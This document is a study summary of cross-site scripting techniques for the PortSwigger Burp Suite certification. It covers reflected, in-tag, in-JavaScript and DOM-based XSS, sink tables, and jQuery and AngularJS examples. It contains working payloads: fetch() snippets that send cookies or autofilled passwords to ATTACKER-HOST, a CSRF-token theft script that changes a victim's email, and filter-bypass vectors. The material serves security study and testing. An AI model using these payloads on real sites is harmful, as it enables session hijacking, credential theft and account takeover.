##### PortSwigger BurpSuite Certification Summary
# XSS
The classic way of checking if there is a XSS vulnerability is invoking the `alert()` or `print()` function:
```
<script>alert(1)</script>
```

To show on which domain the JS code is executing on, this can be used:
```
<script>alert(document.domain)</script>
```
## Reflected XSS
This method of XSS is the simplest version and can be done when the application reflects data of a request in the response. For example, a parameter might be given with a request:
```
https://website.com/search?parameter=foo
```

Information can be sent to a host controlled by the attacker in the following way:
```
<script>
fetch('https://ATTACKER-HOST', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

This sends the user's cookie to the attacker's host, a common technique, as a user cookie allows for impersonation.

Another effective way of obtaining credentials is to make the user's password autocompletion fill in the password and sending it to the attacker. For this, a login form is used:
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://ATTACKER-HOST',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Triggering some (for the attacker benefitial) action can sometimes be done directly, such as a password reset:
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
## XSS Context
It is important to understand where the attack vector lies, i.e. in which context the XSS will happen. 

### XSS between HTML Tags
In this context, the attacker needs to introduce some "new" HTML tag(s) designed to execute the desired methods. In the simplest case, the `<script>` can be used directly to run JS code. However, it is common to find most useful tags and attributes blocked. Luckily, there are other ways...

#### Blocked Tags and Attributes
HTML elements can be blocked by the WAF, but there can still be some permitted. Enumerating all possible tags will reveal which and can be done with the Burp Intruder. In the according input, try all tags with:
```
<§§>
```

If a permitted tag is found, the events should be enumerated:
```
<body §§=1>
```

When knowing which tag and event is permitted, an attack can be crafted that triggeres an event:
```
<iframe src="https://VICTIM-HOST/?search=<body onresize=print()>" onload=this.style.width='100px'>
```

It can be that only custom tags are allowed. However, it is fairly easy to define one's own tags:
```
<script>
location = 'https://VICTIM-HOST/?search=<xss id=x onfocus=alert(1) tabindex=1>#x';
</script>
```

Here the `location` variable is needed for the exploit to work. The tag name and id however are arbitrary. The `onfocus` event is triggered with the `#x` command.

In case `SVG` tags are allowed with an animation action, the command can look something like this:
```
<svg><animatetransform onbegin=alert(1)>
```
The XSS cheat sheet provides all actions for the `animatetransform` which can be enumerated as usually. 

### XSS within HTML Tags
In this scenario, the script will be defined within a tag, so the normal flow has to be broken first. Often the brackets are blocked, but there are ways of breaking out of the tag, e.g.:
```
" autofocus onfocus=alert(1) x="
```
This sequence tries to focus on the element and triggering the `onfocus` event. The `x=` is there to produce valid code after the breakout happened.

The tag can also allow JS code to be run natively, such as `href`:
```
<a href="javascript:alert(1)">
```

If the context is within an `img` tag:
```
<img src="/resources?searchTerms=xxxx">
```
the following can be used to escape and trigger an alert:
```
"><svg onload=alert(1)>
```


##### Access Keys
There is a functionality which allows shortcut to be defined for an action, such as opening a link. An `accesskey` attribute can be set for the whole page and trigger an arbitrary command:
```
http://VICTIM-HOST?'accesskey='x'onclick='alert(1)
```
### XSS within JavaScript
This is a scenario where the XSS context is in some JS code. The attacker can break out of the script and perform arbitrary actions:
```
</script><img src=1 onerror=alert(1)>
```
This leaves the script broken, but the attacker code is still carried out. The context in which the user input is in can often be seen in the response, e.g.:
```
<script>
  var searchTerms = 'lolo\'lol';
  document.write('<img src="/resources/images/tracker.gif? 
  searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
where it can also be seen which characters get escaped.

In case the string can be escaped, JS code can be carried out directly. For this, the script has to be "fixed" after escaping the string, because the script runs only if it works as a whole. Escaping can be done with:
```
'-alert(1)-'
';alert(1)//
```
The minus is "wrong" JS code in this situation, however, it can be used to separate commands between each other.

In the situation where quote characters are escaped with a backslash, it can still be that the backslash itself is not escaped. Therefore, the convertion looks like this:
```
\';alert(1)//

becomes

\\';alert(1)//
```
In case the `replace()` function is encountered, it is worth knowing that without porper matching, only the first occurance will be matched. This means an attacker can just submit the characters that will be replaced as a prefix.

#### HTML Encoding
Let there be the following scenario:
  * The XSS context is
    `<a href"#" onclick=" ... var input='controllable data'; ...">`
  * The app blocks or escapes single quote characters
  * The workflow is:
	  * Parse out the HTML tags and attributes
	  * HTML decoding of tag attribute values
	  * Further processing (running JS code)

 Due to the flow of how the data is processed, it is possible to use HTML encoding to smuggle in a blocked or escaped character. The encoded character will not trigger the validation and the decoding will put it into a valid character:
 ```
 &apos;-alert(1)-&apos;
 ```
where `&apos` is decoded to the single quote character (apostrophe).

#### Template Literals
JS offers the possibility to create strings with embedded expressions, such as a variable acces:
`var input= (backtick) Hello ${user.name} (backtick)`
where the literal mode is entered with a backtick. Any expression an attacker desires to execute can therefore be embedded directly with the `${}` environment without having to escape the current sequence.

## DOM-Based XSS
The Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page. With JS it is possible to manipulate the DOM which enables many functionalities on a website. If an attacker can control some value (the source) which is then passed to a function (the sink) a security issue arises.
Common sources and sinks are:

| Source      | Sink |
| ----------- | ----------- |
| document.URL | document.write() |
| document.documentURI |window.location |
| document.URLUnencoded |document.cookie |
| document.baseURI |eval() |
| location |WebSocket() |
| document.cookie |element.src |
| document.referrer |document.domain | 
| window.name |postMessage() |
| history.pushState |setRequestHeader() |
| history.replaceState |FileReader.readAsText() |
| localStorage |ExecuteSql() |
| sessionStorage |sessionStorage.setItem() |
| IndexedDB (mozIndexedDB,<br> webkitIndexedDB, msIndexedDB) |document.evaluate() |
| Database |JSON.parse() |
|| element.setAttribute() |
|| RegExp()  |
| | element.innerHTML |
||element.outerHTML|
||element.insertAdjacentHTML|
||element.onevent|
||document.writeln()|
Note: Taint flow can happen between any source and sink

The most common source is the URL which is often accessed with the `location` object.
DOM-based vulnerabilities can be maticilous to find manually and it is recommended to use the pre-installed plugin in the Burp Chromium browser `DOM Invader`.

### innerHTML
This sink is commonly encountered and does not allow the `<script>` or `<svg...onload>` , so alternatives need to be used:
```
img, iframe

with onerror, onload
```

### Third Party Libraries
Using third party libraries, such as JQuery or Angular, can introduce sinks.

#### JQuery

An example is the `attr()` funciton in JQuery:
```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
The user controlled `returnUrl` can easily be abused:
```
?returnUrl=javascript:alert(1)
```

Another common functionality of JQuery is the `location.hash` which is used to recognize a `hashchange` that triggers an action, such as scroll to the changed element:
```
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```
Notice the `$()` selector function in conjunction with the `location.hash`.
An attacker can craft an `iframe` that loads the website with the above code in place and trigger a `hashchange`:
```
<iframe src="https://VICTIM-HOST#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

The main JQuery sinks are:

| Sink | Sink |
|------|----|
|add()|replaceAll()|
|replaceWith()|wrap()|
|wrapInner()|wrapAll()|
|has()|constructor()|
|init()|index()|
|jQuery.parseHTML()|$.parseHTML()|
|after()|append()|
|animate()|insertAfter()|
|insertBefore()|before()|
|html()|prepend()|


#### AngularJS
AngularJS allows JS code to be executed directly within HTML or attributes. For this, nodes that have the `ng-app` attribute need to be present, as this marks the AngularJS directive. The command to call `alert()` is:
```
{{$on.constructor('alert(1)')()}}
```

### Reflected DOM XSS
"Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink. "
One example is the `eval()` function:
```
eval('var searchResultsObj = ' + this.responseText);
```
which takes strings and converts them into executable code. An attacker can therefore inject JS through the search term that is reflected in the `searchResultsObj`:
```
var searchResultsObj = {"results":[],"searchTerm":"\\"};alert(1)//search+stuff"}	
```